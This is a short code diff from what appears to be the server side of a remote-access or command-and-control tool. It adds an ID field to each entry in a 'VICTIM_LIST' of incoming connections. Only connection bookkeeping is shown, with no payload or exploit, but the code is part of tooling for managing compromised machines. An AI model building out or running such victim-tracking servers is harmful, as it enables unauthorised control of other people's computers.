@@ -19,6 +19,7 @@ def accept_connections(conn, addr):
             settings.ALL_CONNECTIONS.append(addr)
             settings.VICTIM_LIST[settings.VICTIM_CTR]['IP'] = addr
             settings.VICTIM_LIST[settings.VICTIM_CTR]['CONNECTION'] = conn
+            settings.VICTIM_LIST[settings.VICTIM_CTR]['ID'] = settings.VICTIM_CTR
             settings.VICTIM_CTR += 1
             print('\nConnection has been established: ' + addr)
         except:
